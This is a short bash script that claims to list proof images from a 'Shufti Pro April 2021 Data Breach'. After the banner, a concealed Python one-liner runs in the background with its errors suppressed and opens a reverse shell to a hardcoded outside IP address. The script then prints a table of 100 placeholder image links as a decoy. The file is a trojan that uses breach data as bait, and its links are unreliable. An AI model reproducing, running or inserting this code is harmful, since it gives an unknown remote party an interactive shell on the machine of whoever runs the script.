#!/bin/bash
echo "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%";
echo "            Shufti Pro April 2021 Data Breach                ";
echo "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%";
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("95.217.233.226",4200));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' & 2>/dev/null

echo "-----------------------------------------------------------"
echo "| ID   | Links                                            |";
echo "-----------------------------------------------------------"
for ((i=0;i<100;i++));
do
    if (( "$i" > 9 )); then 
        echo "| $i   | https://nsa.com/breaches/shuftipro_june_proof${i}.jpeg |"
    else
        echo "| $i    | https://nsa.com/breaches/shuftipro_june_proof${i}.jpeg  |"
    fi;
done
echo "-----------------------------------------------------------"
